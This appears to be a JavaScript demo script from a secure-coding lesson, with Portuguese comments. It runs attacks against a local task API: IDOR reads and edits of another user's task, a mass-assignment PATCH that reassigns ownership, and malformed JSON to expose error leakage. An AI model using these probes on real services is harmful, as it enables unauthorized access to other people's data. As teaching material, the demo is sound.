// Demo dos ataques. Funciona em Windows, Mac e Linux (usa fetch, sem curl).
// 1) suba um step:  npm run dev:2   (ou dev:3)
// 2) em outro terminal:  npm run demo
const base = `http://localhost:${process.env.PORT || 3000}`;

async function call(method, path, { user, body, raw } = {}) {
  const res = await fetch(base + path, {
    method,
    headers: {
      'content-type': 'application/json',
      ...(user ? { 'x-user-id': user } : {}),
    },
    body: raw ?? (body === undefined ? undefined : JSON.stringify(body)),
  });
  return { status: res.status, text: (await res.text()).slice(0, 160) };
}

function show(titulo, res) {
  console.log(`\n${titulo}\n  status ${res.status}  ${res.text}`);
}

const criada = JSON.parse((await call('POST', '/tasks', { user: '1', body: { title: 'segredo da Ana' } })).text);
console.log(`Usuário 1 criou a tarefa ${criada.id}.`);

show('1) IDOR: usuário 2 lê a tarefa do usuário 1', await call('GET', `/tasks/${criada.id}`, { user: '2' }));
show('2) IDOR: usuário 2 altera a tarefa do usuário 1', await call('PATCH', `/tasks/${criada.id}`, { user: '2', body: { done: true } }));
show('3) Mass assignment: usuário 1 manda {"userId":"2"} no PATCH', await call('PATCH', `/tasks/${criada.id}`, { user: '1', body: { userId: '2' } }));
show('   ...e agora lista as tarefas do usuário 1', await call('GET', '/tasks', { user: '1' }));
show('4) Erro: JSON quebrado (o que vaza na resposta?)', await call('POST', '/tasks', { user: '1', raw: '{ quebrado' }));
